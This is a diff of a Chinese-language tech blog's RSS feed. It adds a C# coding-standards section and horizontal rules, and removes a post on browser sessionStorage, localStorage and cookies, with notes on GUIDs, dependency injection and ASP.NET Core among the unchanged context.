@@ -22,7 +22,6 @@
 &lt;h2 id=&#34;index&#34;&gt;Index&lt;/h2&gt;
 &lt;h3 id=&#34;聚集索引&#34;&gt;聚集索引&lt;/h3&gt;
 &lt;h3 id=&#34;非聚集索引&#34;&gt;非聚集索引&lt;/h3&gt;
-&lt;h4 id=&#34;heading&#34;&gt;&lt;/h4&gt;
 - https://www.openheart.icu/cs/sqlserver/ - ALL RIGHTS RESERVED KRIS NIE</description>
         </item>
     
@@ -56,6 +55,7 @@
 &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/58300922/how-to-enable-the-view-hot-reloading-in-rider&#34;&gt;How to enable the view hot-reloading in Rider? &lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/aspnet/core/mvc/views/view-compilation?view=aspnetcore-3.0&amp;amp;tabs=visual-studio#runtime-compilation&#34;&gt;Razor file compilation in ASP.NET Core&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;hr&gt;
 &lt;h1 id=&#34;watch-out-project-on-rider&#34;&gt;Watch out Project On Rider&lt;/h1&gt;
 &lt;p&gt;To let Project hot-reload, we can use the &amp;ldquo;Before launch&amp;rdquo; option as a run configuration to make this happen. To do so:&lt;/p&gt;
 &lt;ol&gt;
@@ -75,6 +75,7 @@
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/46349038/jetbrains-rider-run-with-watch&#34;&gt;JetBrains Rider run with watch&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
+&lt;hr&gt;
 &lt;h1 id=&#34;newguid&#34;&gt;NewGuid()&lt;/h1&gt;
 &lt;h2 id=&#34;guid&#34;&gt;GUID&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;全局唯一标识符&lt;/strong&gt;（Globally Unique &lt;strong&gt;Id&lt;/strong&gt;entifier，缩写：&lt;strong&gt;GUID&lt;/strong&gt;；发音为/ˈɡuːɪd/或/ˈɡwɪd/）是一种由&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%AE%97%E6%B3%95&#34;&gt;算法&lt;/a&gt;生成的唯一标识，通常表示成32个16进制数字（0－9，A－F）组成的字符串，如：&lt;code&gt;{21EC2020-3AEA-1069-A2DD-08002B30309D}&lt;/code&gt;，它实质上是一个128位长的二进制整数。GUID一词有时也专指微软对UUID标准的实现。&lt;/p&gt;
@@ -117,6 +118,7 @@
 &lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;P&amp;rdquo;)	: (a99839b9-da94-40fd-87a5-4a5e73677b1f)&lt;/p&gt;
 &lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;X&amp;rdquo;)	: {0xb294a44e,0x43d9,0x4b60,{0xb5,0xb9,0x32,0x29,0xae,0x46,0x45,0x17}}&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;如果在程序中使用&lt;strong&gt;D&lt;/strong&gt;，则需要注意数据库字段长应为&lt;code&gt;36&lt;/code&gt;而不是32&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
 &lt;h1 id=&#34;model--entity--dto--viewmodel&#34;&gt;model &amp;amp; entity &amp;amp; dto &amp;amp; viewmodel&lt;/h1&gt;
 &lt;h2 id=&#34;model&#34;&gt;model&lt;/h2&gt;
 &lt;p&gt;model是一个模型，里面装了各种数据，将一个model传递给view，在试图页面就可以使用model里面的数据来呈现到页面上。&lt;/p&gt;
@@ -136,6 +138,7 @@
 &lt;li&gt;&lt;a href=&#34;https://www.zhihu.com/question/25256772/answer/194493331&#34;&gt;什么时候用Model，什么时候用Entity？ - 虚若影的回答 - 知乎&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.zhihu.com/question/25256772/answer/30290376&#34;&gt;什么时候用Model，什么时候用Entity？ - 赵劼的回答 - 知乎&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;hr&gt;
 &lt;h1 id=&#34;dependency-injection&#34;&gt;Dependency Injection&lt;/h1&gt;
 &lt;h2 id=&#34;ioc&#34;&gt;IOC&lt;/h2&gt;
 &lt;p&gt;Spring 框架为Java提供了IOC（Inversion of Control），只是提供了一个服务容器，程序控制我们需要的对象，而不是在使用对象时我们亲自直接控制。既然提到了IOC就详细了解一下这种设计思想：&lt;/p&gt;
@@ -274,6 +277,7 @@
 &lt;li&gt;&lt;a href=&#34;https://flylib.com/books/en/4.444.1.71/1/&#34;&gt;A Simple DIP Example&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1&#34;&gt;Dependency injection in ASP.NET Core&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;hr&gt;
 &lt;h1 id=&#34;iviewlocationexpander&#34;&gt;IViewLocationExpander&lt;/h1&gt;
 &lt;p&gt;实现&lt;code&gt;IViewLocationExpander&lt;/code&gt;接口，&lt;code&gt;location&lt;/code&gt;为build时程序检查的views层路径&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ViewLocationExpander&lt;/span&gt;: IViewLocationExpander
@@ -308,6 +312,7 @@
 &lt;li&gt;&lt;a href=&#34;https://www.c-sharpcorner.com/article/expanding-razor-view-location-and-sub-areas-in-asp-net-core/&#34;&gt;Expanding Razor View Location And Sub Areas In ASP.NET Core&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/NonFactors/AspNetCore.Template/blob/378d64f6900f0cc95eee921b5caf81d2bc9efc11/src/MvcTemplate.Components/Mvc/Razor/ViewLocationExpander.cs&#34;&gt;AspNetCore.Template/src/MvcTemplate.Components/Mvc/Razor/ViewLocationExpander.cs&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;hr&gt;
 &lt;h1 id=&#34;error-the-database-provider-attempted-to-register-an-implementation&#34;&gt;Error: The database provider attempted to register an implementation&amp;hellip;&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;The database provider attempted to register an implementation of the &amp;lsquo;IRelationalTypeMappingSource&amp;rsquo; service. This is not a service defined by EF and as such must be registered as a provider-specific service using the &amp;lsquo;TryAddProviderSpecificServices&amp;rsquo;&lt;/p&gt;
@@ -316,6 +321,111 @@
 &lt;p&gt;You are mixing different versions of EF Core!!!&lt;/p&gt;
 &lt;h2 id=&#34;reference-5&#34;&gt;Reference&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/npgsql/efcore.pg/issues/1441&#34;&gt;Cannot register IRelationalTypeMappingSource #1441&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;c编程规范&#34;&gt;C#编程规范&lt;/h1&gt;
+&lt;h2 id=&#34;命名规范&#34;&gt;命名规范&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;【强制】代码中的命名均不能以&lt;code&gt;下划线或美元符号&lt;/code&gt;开始，也不能以下划线或美元符号结束。&lt;/li&gt;
+&lt;li&gt;【强制】代码中的命名&lt;code&gt;严禁使用拼音与英文混合&lt;/code&gt;的方式，更不允许直接使用中文的方式。&lt;/li&gt;
+&lt;li&gt;【强制】&lt;code&gt;类名&lt;/code&gt;，&lt;code&gt;方法名&lt;/code&gt;，&lt;code&gt;属性&lt;/code&gt;，&lt;code&gt;枚举名&lt;/code&gt;，&lt;code&gt;接口名&lt;/code&gt;，&lt;code&gt;委托&lt;/code&gt;，&lt;code&gt;事件&lt;/code&gt;，&lt;code&gt;命名空间&lt;/code&gt;，使用&lt;code&gt;UpperCamelCase&lt;/code&gt;风格，必须遵从驼峰形式。通用缩写除外，如BO&lt;/li&gt;
+&lt;li&gt;【强制】&lt;code&gt;参数名&lt;/code&gt;、&lt;code&gt;成员变量&lt;/code&gt;、&lt;code&gt;局部变量&lt;/code&gt;都统一使用&lt;code&gt;lowerCamelCase&lt;/code&gt; 风格，必须遵从驼峰形式。如&lt;code&gt;localValue&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;【强制】常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。如&lt;code&gt;MAX_STOCK_COUNT&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;【强制】抽象类命名使用&lt;code&gt;Abstract&lt;/code&gt;或&lt;code&gt;Base&lt;/code&gt;开头；异常类命名使用&lt;code&gt;Exception&lt;/code&gt;结尾；测试类命名以它要测试的类的名称开始，以&lt;code&gt;Test&lt;/code&gt; 结尾。&lt;/li&gt;
+&lt;li&gt;【强制】杜绝完全不规范的缩写，避免望文不知义。&lt;code&gt;AbstractClass&lt;/code&gt;缩写命名成&lt;code&gt;AbsClass&lt;/code&gt;；&lt;code&gt;condition&lt;/code&gt;缩写命名成&lt;code&gt;condi&lt;/code&gt;，此类随意缩写严重降低了代码的可阅读性。&lt;/li&gt;
+&lt;li&gt;【推荐】如果使用到了设计模式，建议在类名中体现出具体模式。如&lt;code&gt;public class OrderFactory&lt;/code&gt;;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;格式规范&#34;&gt;格式规范&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;【强制】大括号的使用约定。如果是大括号内为空，则简洁地写成&lt;code&gt;{}&lt;/code&gt;即可，不需要换行；如果是非空代码块则两个半括号都另起一行和类首对齐。&lt;/li&gt;
+&lt;li&gt;【强制】左小括号和右边相邻字符之间不出现空格；同样，右小括号和左边相邻字符之间也不出现空格。&lt;/li&gt;
+&lt;li&gt;【强制】&lt;code&gt;if/for/while/switch/do&lt;/code&gt;等保留字与小括号之间都必须加空格。&lt;/li&gt;
+&lt;li&gt;【强制】任何运算符左右必须加一个空格。&lt;/li&gt;
+&lt;li&gt;【强制】缩进采用&lt;code&gt;4个空格&lt;/code&gt;，禁止使用tab字符。或者在设置里面把tab设置为四个空格&lt;/li&gt;
+&lt;li&gt;【强制】单行字符数限制不超过120个，超出需要换行，换行时遵循如下原则：
+1） 第二行相对第一行缩进4个空格，从第三行开始，不再继续缩进，参考示例。
+2） 运算符与下文一起换行。
+3） 方法调用的点符号与下文一起换行。
+4） 在多个参数超长，逗号后进行换行。
+5） 在括号前不要换行。&lt;/li&gt;
+&lt;li&gt;【强制】方法参数在定义和传入时，多个参数逗号后边必须加空格。&lt;/li&gt;
+&lt;li&gt;【强制】IDE 的&lt;code&gt;text file encoding&lt;/code&gt;设置为&lt;code&gt;UTF-8&lt;/code&gt;;IDE中文件的&lt;code&gt;换行符&lt;/code&gt;使用&lt;code&gt;Unix&lt;/code&gt;格式，不要使用windows格式。&lt;/li&gt;
+&lt;li&gt;【推荐】没有必要增加若干空格来使某一行的字符与上一行的相应字符对齐。&lt;/li&gt;
+&lt;li&gt;【推荐】方法体内的执行语句组、变量的定义语句组、不同的业务逻辑之间或者不同的语义之间插入一个&lt;code&gt;空行&lt;/code&gt;。相同业务逻辑和语义之间不需要插入空行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;oop-规范&#34;&gt;OOP 规范&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;【强制】避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成本，直接用类名来访问即可。&lt;/li&gt;
+&lt;li&gt;【强制】所有的相同类型的包装类对象之间值的比较，全部使用&lt;code&gt;Equals&lt;/code&gt;方法比较。&lt;/li&gt;
+&lt;li&gt;【强制】构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在&lt;code&gt;Init&lt;/code&gt;方法中。。&lt;/li&gt;
+&lt;li&gt;【推荐】使用索引访问用String的&lt;code&gt;Split&lt;/code&gt;方法得到的数组时，需做最后一个分隔符后有无内容的检查，否则会有抛IndexOutOfBoundsException的风险。&lt;/li&gt;
+&lt;li&gt;【推荐】当一个类有多个构造方法，或者多个同名方法，这些方法应该按顺序放置在一起，便于阅读。&lt;/li&gt;
+&lt;li&gt;【推荐】 类内方法定义顺序依次是：&lt;code&gt;公有方法或保护方法&lt;/code&gt; &amp;gt; &lt;code&gt;属性&lt;/code&gt; &amp;gt; &lt;code&gt;私有方法&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;【推荐】循环体内，字符串的连接方式，使用&lt;code&gt;StringBuilder的append&lt;/code&gt;方法进行扩展。&lt;/li&gt;
+&lt;li&gt;【推荐】类成员与方法&lt;code&gt;访问控制从严&lt;/code&gt;：
+1） 如果不允许外部直接通过new来创建对象，那么构造方法必须是private。
+2） 工具类不允许有public或default构造方法。
+3） 类非static成员变量并且与子类共享，必须是protected。
+4） 类非static成员变量并且仅在本类使用，必须是private。
+5） 类static成员变量如果仅在本类使用，必须是private。
+6） 若是static成员变量，必须考虑是否为final。
+7） 类成员方法只供类内部调用，必须是private。
+8） 类成员方法只对继承类公开，那么限制为protected。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;控制语句&#34;&gt;控制语句&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;【强制】在一个&lt;code&gt;switch块&lt;/code&gt;内，每个&lt;code&gt;case&lt;/code&gt;要么通过&lt;code&gt;break/return&lt;/code&gt;等来终止，要么注释说明程序将继续执行到哪一个case为止；在一个switch块内，都必须包含一个&lt;code&gt;default&lt;/code&gt;语句并且放在最后，即使它什么代码也没有。&lt;/li&gt;
+&lt;li&gt;在&lt;code&gt;if/else/for/while/do&lt;/code&gt;语句中必须使用大括号。即使只有一行代码，避免使用单行的形式&lt;/li&gt;
+&lt;li&gt;【推荐】表达异常的分支时，&lt;code&gt;少用if-else&lt;/code&gt;方式，这种方式可以改写成：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-kotlin&#34; data-lang=&#34;kotlin&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (condition) 
+{
+    ...
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; obj;
+}
+&lt;span style=&#34;color:#228b22&#34;&gt;// 接着写else的业务逻辑代码;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;【推荐】除常用方法（如getXxx/isXxx）等外，不要在条件判断中执行其它复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。&lt;/li&gt;
+&lt;li&gt;【推荐】&lt;code&gt;循环体&lt;/code&gt;中的语句要&lt;code&gt;考量性能&lt;/code&gt;，以下操作尽量移至循环体外处理，如&lt;code&gt;定义对象、变量、获取数据库连接&lt;/code&gt;，进行不必要的try-catch操作（这个try-catch是否可以移至循环体外）。&lt;/li&gt;
+&lt;li&gt;【参考】下列情形，需要进行&lt;code&gt;参数校验&lt;/code&gt;：
+1） 调用频次低的方法。
+2） 执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参数错误导致中间执行回退，或者错误，那得不偿失。
+3） 需要极高稳定性和可用性的方法。
+4） 对外提供的开放接口，不管是RPC/API/HTTP接口。
+5） 敏感权限入口。&lt;/li&gt;
+&lt;li&gt;【参考】下列情形，不需要进行参数校验：
+1） 极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查要求。
+2） 底层调用频度比较高的方法。
+3） 被声明成private只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检查或者肯定不会有问题，此时可以不校验参数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;注释规范&#34;&gt;注释规范&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;【强制】所有的类都必须添加创建者和创建日期。&lt;/li&gt;
+&lt;li&gt;【强制】方法内部单行注释，在被注释语句上方另起一行，使用&lt;code&gt;//&lt;/code&gt;注释。方法内部多行注释使用&lt;code&gt;/* */&lt;/code&gt;注释，注意与代码对齐。&lt;/li&gt;
+&lt;li&gt;【强制】所有的枚举类型字段必须要有&lt;code&gt;注释&lt;/code&gt;，说明每个数据项的用途。&lt;/li&gt;
+&lt;li&gt;【推荐】代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑等的修改。&lt;/li&gt;
+&lt;li&gt;【参考】合理处理注释掉的代码。尽量在目标代码上方&lt;code&gt;详细说明&lt;/code&gt;，而不是简单的注释掉。如果无用，则&lt;code&gt;直接删除&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;【参考】对于注释的要求：
+第一、能够准确反应设计思想和代码逻辑；
+第二、能够描述业务含义，使别的程序员能够迅速了解到代码背后的信息。完全没有注释的大段代码对于阅读者形同天书，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。&lt;/li&gt;
+&lt;li&gt;【参考】好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释是相当大的负担。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
 - https://www.openheart.icu/cs/dot-net-issue/ - ALL RIGHTS RESERVED KRIS NIE</description>
         </item>
     
@@ -628,407 +738,6 @@ a[11] = {0, 1, 16, 24, 35, 47, 59, 62, 73, 88, 99}&lt;/p&gt;
     
     
         <item>
-        <title>SessionStorage &amp; LocalStorage &amp; Cookie</title>
-        <link>https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/</link>
-        <pubDate>Sat, 25 Jul 2020 11:42:23 +0000</pubDate>
-        
-        <guid>https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/</guid>
-        <description>42th openheart https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/ -&lt;h1 id=&#34;windowsessionstorage&#34;&gt;Window.sessionStorage&lt;/h1&gt;
-&lt;p&gt;&lt;code&gt;sessionStorage&lt;/code&gt; 属性允许你访问一个，对应当前源的 session &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。它与 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&#34;&gt;&lt;code&gt;localStorage&lt;/code&gt;&lt;/a&gt; 相似，不同之处在于 &lt;code&gt;localStorage&lt;/code&gt; 里面存储的数据没有过期时间设置，而存储在 &lt;code&gt;sessionStorage&lt;/code&gt; 里面的数据在页面会话结束时会被清除。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文&lt;/strong&gt;，这点和 session cookies 的运行方式不同。&lt;/li&gt;
-&lt;li&gt;打开多个相同的URL的Tabs页面，会创建各自的&lt;code&gt;sessionStorage&lt;/code&gt;。&lt;/li&gt;
-&lt;li&gt;关闭对应浏览器tab，会清除对应的&lt;code&gt;sessionStorage&lt;/code&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;应该注意，存储在sessionStorage或localStorage中的数据&lt;strong&gt;特定于页面的协议&lt;/strong&gt;。也就是说&lt;code&gt;http://example.com&lt;/code&gt; 与 &lt;code&gt;https://example.com&lt;/code&gt;的sessionStorage相互隔离。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 保存数据到 sessionStorage
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;sessionStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;);
-
-&lt;span style=&#34;color:#228b22&#34;&gt;// 从 sessionStorage 获取数据
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;let&lt;/span&gt; data = sessionStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;);
-
-&lt;span style=&#34;color:#228b22&#34;&gt;// 从 sessionStorage 删除保存的数据
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;sessionStorage.removeItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;);
-
-&lt;span style=&#34;color:#228b22&#34;&gt;// 从 sessionStorage 删除所有保存的数据
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;sessionStorage.clear();
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;返回值&#34;&gt;返回值&lt;/h3&gt;
-&lt;p&gt;一个 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。&lt;/p&gt;
-&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
-&lt;p&gt;下面的代码访问当前域名的 session &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，并使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 访问往里面添加一个数据条目。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;sessionStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Tom&amp;#39;&lt;/span&gt;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面的示例会自动保存一个文本输入框的内容，如果浏览器因偶然因素被刷新了，文本输入框里面的内容会被恢复，因此写入的内容不会丢失。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 获取文本输入框
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;let&lt;/span&gt; field = &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;field&amp;#34;&lt;/span&gt;);
- 
-&lt;span style=&#34;color:#228b22&#34;&gt;// 检测是否存在 autosave 键值
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// (这个会在页面偶然被刷新的情况下存在)
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (sessionStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;autosave&amp;#34;&lt;/span&gt;)) {
-  &lt;span style=&#34;color:#228b22&#34;&gt;// 恢复文本输入框的内容
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;  field.value = sessionStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;autosave&amp;#34;&lt;/span&gt;);
-}
- 
-&lt;span style=&#34;color:#228b22&#34;&gt;// 监听文本输入框的 change 事件
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;field.addEventListener(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;change&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt;() {
-  &lt;span style=&#34;color:#228b22&#34;&gt;// 保存结果到 sessionStorage 对象中
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;  sessionStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;autosave&amp;#34;&lt;/span&gt;, field.value);
-});
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;windowlocalstorage&#34;&gt;Window.localStorage&lt;/h1&gt;
-&lt;p&gt;只读的&lt;code&gt;localStorage&lt;/code&gt; 属性允许你访问一个&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Document&#34;&gt;&lt;code&gt;Document&lt;/code&gt;&lt;/a&gt; 源（origin）的对象 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt;；存储的数据将保存在浏览器会话中。&lt;code&gt;localStorage&lt;/code&gt; 类似 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&#34;&gt;&lt;code&gt;sessionStorage&lt;/code&gt;&lt;/a&gt;，但其区别在于：存储在 &lt;code&gt;localStorage&lt;/code&gt; 的数据可以长期保留；而当页面会话结束——也就是说，当页面被关闭时，存储在 &lt;code&gt;sessionStorage&lt;/code&gt; 的数据会被清除 。&lt;/p&gt;
-&lt;p&gt;应注意，无论数据存储在 &lt;code&gt;localStorage&lt;/code&gt; 还是 &lt;code&gt;sessionStorage&lt;/code&gt; ，&lt;strong&gt;它们都特定于页面的协议。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;另外，&lt;code&gt;localStorage&lt;/code&gt; 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).&lt;/p&gt;
-&lt;h2 id=&#34;语法-1&#34;&gt;语法&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;myStorage = localStorage;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;值&#34;&gt;值&lt;/h3&gt;
-&lt;p&gt;一个可被用于访问当前源（ origin ）的本地存储空间的 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。&lt;/p&gt;
-&lt;h3 id=&#34;异常&#34;&gt;异常&lt;/h3&gt;
-&lt;h4 id=&#34;securityerror&#34;&gt;SecurityError&lt;/h4&gt;
-&lt;p&gt;请求违反了一个策略声明，或者源（ origin ）不是 &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Definition_of_an_origin&#34;&gt;一个有效的 scheme/host/port tuple&lt;/a&gt; （例如如果origin使用 &lt;code&gt;file:&lt;/code&gt; 或者 &lt;code&gt;data:&lt;/code&gt; 形式将可能发生）。比如，用户可以有禁用允许对指定的origin存留数据的浏览器配置。&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;TODO：没大弄明白&lt;/em&gt;&lt;/p&gt;
-&lt;h3 id=&#34;示例-1&#34;&gt;示例&lt;/h3&gt;
-&lt;p&gt;下面的代码片段访问了当前域名下的本地 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，并通过 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 增加了一个数据项目。&lt;/p&gt;
